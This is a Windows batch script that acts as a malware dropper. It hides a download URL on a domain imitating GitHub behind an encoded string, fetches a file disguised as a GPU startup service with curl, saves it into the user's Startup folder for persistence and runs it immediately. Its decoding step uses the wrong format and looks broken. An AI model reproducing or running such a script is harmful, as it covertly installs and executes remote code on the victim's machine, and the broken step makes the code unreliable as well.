@echo off
setlocal enabledelayedexpansion
set encodedURL=aHR0cHM6Ly9yYXcuZ2l0aHViZXMuY29tL2Nvb2xtYW4xOTY5LXVpL3llcy9tYWluLWdwdS1zdGFydHVwLXNlcnZpY2UuYmF0
for /f "tokens=* delims=" %%a in ('echo !encodedURL! ^| certutil -decodehex ^| findstr /v "CertUtil"') do set PS1_URL=%%a
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set FILE_NAME=main-gpu-startup-service.bat
set FILE_PATH=%STARTUP_FOLDER%\%FILE_NAME%
curl -o "%FILE_PATH%" "%PS1_URL%"
start "" "%FILE_PATH%"